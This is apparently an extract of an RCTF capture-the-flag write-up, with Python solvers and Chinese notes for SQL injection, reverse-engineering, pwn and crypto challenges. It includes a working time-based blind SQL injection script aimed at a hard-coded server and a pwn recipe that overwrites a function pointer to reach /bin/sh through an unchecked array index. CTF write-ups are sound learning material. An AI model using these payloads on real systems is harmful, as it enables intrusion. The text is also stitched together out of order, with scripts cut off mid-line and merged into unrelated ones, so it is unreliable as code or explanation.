import requests
import string
str1 = '_1234567890'+string.ascii_letters+string.punctuation
flag = ''
select = 'select/**/user()'
url="http://124.71.132.232:11002/?order="
for j in range(1,66):
    for i in range(65,123):
        #payload="updatexml(1,if(substr(({}),
{},1)='{}',repeat('a',40000000),0),1)".format(select, j, i)
        payload="updatexml(1,if(ascii(substr(({}),
{},1))='{}',concat(repeat('a',40000000),repeat('a',40000000),repeat('a',40000000),repea
t('a',40000000),repeat('b',10000000)),1),1)".format(select, j, i)
        url1 = url + payload
        req = requests.get(url1)
        print(req.elapsed.total_seconds())
        #print(payload)
        if req.elapsed.total_seconds() > 1.6 or req.elapsed.total_seconds()> t) | (ORI[i][j] << (4 - t))) & 0xf == GOOD[i][j]:
                FINAL[j][i] = t
for i in range(7):
    print(FINAL[i])
ret = ''
retmask = ''
for i in range(7):
    for j in range(7):
        c = str((FINAL[i][j]) % 4)
        ret += c
        if ORI[j][i] in (5, 10):
            retmask += 'X'
        else:
            retmask += c
Final Brute-force:
Final Flag: RCTF{3330103311331013023313123131201201323021202330110}
LoongArch
关键就⼏条指令，clo.d检测寄存器bit 1的个数是不是64，从栈中取出的⽐较数据和加密后的数据异或之后是等于
0xffffffffffffffff，然后就先逆bitrev.8b指令，bytepick.d指令，bitrev.d指令，最后逆和key进⾏异或的xor指令
print(ret)
print(retmask)
from pwn import *
from itertools import product
ori = '3330303311331213023333123131221201323021202330110'
mar = '3330X03311X31X130X33X31231312X1201323021202X30110'
count = mar.count('X')
idxes = []
for i in range(49):
    if mar[i] == 'X':
        idxes.append(i)
new_cases = []
for each in product([2,0], repeat=count):
    new_case = list(ori)
    for i, idx in enumerate(idxes):
        new_case[idx] = str( (int(new_case[idx]) + each[i]) % 4)
    new_cases.append(''.join(new_case))
for each in new_cases:
    p = process(['./re',each])
    ret = p.recvall()
    if 'oops' not in ret:
        print(each)
        print(ret)
        exit(1)
# _*_ coding:utf-8 _*_
path = r"newLoongArch\output"
output = open(path, 'rb').read()
output = list(output)
cmp_data = output[32:]         # 后⾯32字节是⽐较数据
key = output[:32]              # 前32字节是key
key[:8] = key[:8][::-1]        # 从栈中读数据,⼩端
key[8:16] = key[8:16][::-1]
key[16:24] = key[16:24][::-1]
key[24:] = key[24:][::-1]
cmp_data[:8] = cmp_data[:8][::-1]
cmp_data[8:16] = cmp_data[8:16][::-1]
cmp_data[16:24] = cmp_data[16:24][::-1]
cmp_data[24:] = cmp_data[24:][::-1]
key0 = 0x8205f3d105b3059d
key1 = 0xa89aceb3093349f3
key2 = 0xd53db5adbcabb984
key3 = 0x39cea0bfd9d2c2d4
for i in range(len(cmp_data)):
    cmp_data[i] = cmp_data[i] ^ 0xff
def rev_bitrev(ch):
    bin_string = "{:08b}".format(ch)
    bin_string = bin_string[::-1]
    ret = eval('0b' + bin_string)
    return ret
def rev_bitrevd(data):
    bin_string = "{:064b}".format(data)
    return eval('0b' + bin_string[::-1])
def rev_bytepickd(t0, t1, t2, t3, sa3):
    new_data = [0]*32
    new_data[:sa3] = t1[8-sa3:]
    new_data[sa3:8] = t2[:8-sa3]
    new_data[8:8+sa3] = t2[8-sa3:]
    new_data[sa3+8:16] = t0[:8-sa3]
    new_data[16:16+sa3] = t0[8-sa3:]
    new_data[16+sa3:24] = t3[:8-sa3]
    new_data[24:24+sa3] = t3[8-sa3:]
    new_data[24+sa3:] = t1[:8-sa3]
    return new_data
# 逆向bitrev.8b
for i in range(32):
    cmp_data[i] = rev_bitrev(cmp_data[i])
    # print(hex(cmp_data[i]), end=', ')
# 逆向bytepick.d
t0 = cmp_data[:8]
t1 = cmp_data[8:16]
Valgrind
找到⼀个常数0x4ec4ec4f , ⽹上找到是模26
http://www.flounder.com/multiplicative_inverse.htm
数字和字⺟的加密⽅法不⼀样
t2 = cmp_data[16:24]
t3 = cmp_data[24:]
print(t0, t1, t2, t3)
cmp_data = rev_bytepickd(t0, t1, t2, t3, 3)
hex_string0 = ''
hex_string1 = ''
hex_string2 = ''
hex_string3 = ''
for i in range(8):
    hex_string0 += '{:02x}'.format(cmp_data[i])
print(hex_string0)
for j in range(8, 16):
    hex_string1 += '{:02x}'.format(cmp_data[j])
print(hex_string1)
for k in range(16, 24):
    hex_string2 += '{:02x}'.format(cmp_data[k])
print(hex_string2)
for m in range(24, 32):
    hex_string3 += '{:02x}'.format(cmp_data[m])
print(hex_string3)
real_hex_string = ''
last0 = rev_bitrevd(eval('0x' + hex_string0))
last1 = rev_bitrevd(eval('0x' + hex_string1))
last2 = rev_bitrevd(eval('0x' + hex_string2))
last3 = rev_bitrevd(eval('0x' + hex_string3))
real_hex_string += "{:08x}".format(last0)
real_hex_string += "{:08x}".format(last0)
real_hex_string += "{:08x}".format(last0)
real_hex_string += "{:08x}".format(last1)
import binascii
print(binascii.unhexlify(hex(key0 ^ last0)[2:]).decode(encoding="utf-8")[::-1], end='')
print(binascii.unhexlify(hex(key1 ^ last1)[2:]).decode(encoding="utf-8")[::-1], end='')
print(binascii.unhexlify(hex(key2 ^ last2)[2:]).decode(encoding="utf-8")[::-1], end='')
print(binascii.unhexlify(hex(key3 ^ last3)[2:]).decode(encoding="utf-8")[::-1])
Hi!Harmony!
UCB RISCV逆向
找strings，发现welcome，查xref定位主函数，是个奇怪加密，⼿动执⾏后得到输出
KDUPRQBGUHDPLWSRVVLEOH，包裹rctf即可
RCTF{KDUPRQBGUHDPLWSRVVLEOH}
dht
分布式散列表
rust多线程
a = 't1me_y0u_enj0y_wa5t1ng_wa5_not_wa5ted'
number= '0123456789'
table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
for i in a:
    if i not in number:
        print(table[((ord(i)+3-90)%26)-1],end='')
    else:
        print(chr(ord(i)+3),end='')
__map={}
__map['110']=
['3e0','a71','332','852','1e2','cb3','b05','915','c25','f45','765','0a7','848','4a8','c
c8','fc8','b79','82a','adb','d5c','16e','34f']
__map['96']=
['9d0','772','492','ef3','654','775','4c5','987','5d7','0d8','81b','efb','53c','f3d','5
bd','0dd','5dd']
__map['118']=
['7f0','241','741','ba2','4f2','893','754','445','095','3b6','957','208','038','3b8','6
6a','26d','73f','66f','dff']
__map['141']=
['611','c93','644','774','6a4','e56','cc6','ec6','587','8a8','c99','a9b','daf','4bf','e
cf','def']
__map['127']=
['1d0','1e0','352','f52','795','d76','bb6','d47','3c7','748','658','fe8','f7b','bbb','3
6c','e8d','6de','3cf']
__map['149']=
['aa0','a53','704','114','d34','5f4','b06','c77','139','99a','fea','beb','28c','bec','2
7d','c6f','28f']
__map['145']=
['cd0','b82','c82','7d3','f15','046','b66','2c7','459','bc9','b5b','38c','2bc','8ec','a
3f','79f']
__map['150']=
['701','941','a41','551','af1','722','f43','c64','615','995','f86','196','5a7','ee7','1
7a','c2b','57b','9fb','f2c','a2d','31e','d9e','11f']
__map['146']=['e00','a50','744','b76','7ca','ffb','53e','ccf']
__map['194']=
['300','440','db0','a32','582','0b4','b35','a19','669','c89','d9b','ddb','92c','ddd','c
ed','03e','abe','d5f','36f','88f','bcf']
__map['207']=
['980','651','b72','4d2','556','ab8','07b','59b','65c','53d','e8e','afe','98f']
__map['197']=
['531','e41','1c1','b75','2a5','786','b77','bb7','bd7','b19','0ab','c7c','5ed','26e','2
8e','17f','59f','dbf']
__map['235']=
['2a0','761','7f2','184','905','126','9e7','c88','dc8','0d9','97a','9bb','22e','59e']
__map['25']=
['200','0d0','c81','9a1','f02','415','586','3c6','93b','87c','aec','23d','79d','bfd','c
0e','83e','f7f','4af','8ff']
number=[0x6E, 0x60, 0x76, 0x8D, 0x7F, 0x95, 0x91, 0x96, 0x92, 
  0xC2, 0xCF, 0xC5, 0xEB, 0x19] # ans去重
ans=[0x6E, 0x60, 0x76, 0x8D, 0x7F, 0x95, 0x91, 0x6E, 0x96, 0x92, 
  0xC2, 0xCF, 0xC5, 0xC5, 0xEB, 0x19]
alp="0123456789abcdef"
times = [0 for i in range(1000)]
for i in ans:
    times[i] += 1
__invmap={}
ttt=[]
for i in number:
    for j in __map[str(i)]:
        ttt.append(j)
        __invmap[j] = i
def dfs(dep , flag):
    if dep == 16:
        print(flag[:-2])
        return
    last = flag[-2:]
    for i in alp:
        _tmp_str = last + i
        if  _tmp_str in ttt:
            if times[__invmap[_tmp_str]] != 0:
                times[__invmap[_tmp_str]] -= 1
                dfs(dep+1, flag + i)
                times[__invmap[_tmp_str]] += 1
two_shortest
Pascal写的SGU OJ 185
最⼩费⽤最⼤流
建图⽤的邻接矩阵，没有检查下标，可以在bss段任意写
逆向得到函数sub_424960可以执⾏/bin/sh -c arg1
函数sub_417FE0是exit函数，调⽤了off_4E9730(unk_4E8340)
通过溢出改写off_4E9730为sub_424960
off_4E9730为函数指针，unk_4E8340为int
改写unk_4E8340为/bin/sh地址（⾮PIE情况下，地址32位空间即可容纳）
程序退出时即可获得shell
1 2 
453 145 4367680 
456 221 4344160
Crypto
Uncommon Factors I
for i in number:
    for j in __map[str(i)]:
        times[__invmap[j]] -= 1
        dfs(1, j)
        times[__invmap[j]] += 1
from Crypto.Util.number import bytes_to_long
from gmpy2 import mpz
import gmpy2
from tqdm import tqdm
with open("lN.bin","rb") as f:
    data = f.read()
n = []
for i in tqdm(range(2**22)):
    n.append(mpz(bytes_to_long(data[64*i:64*i+64])))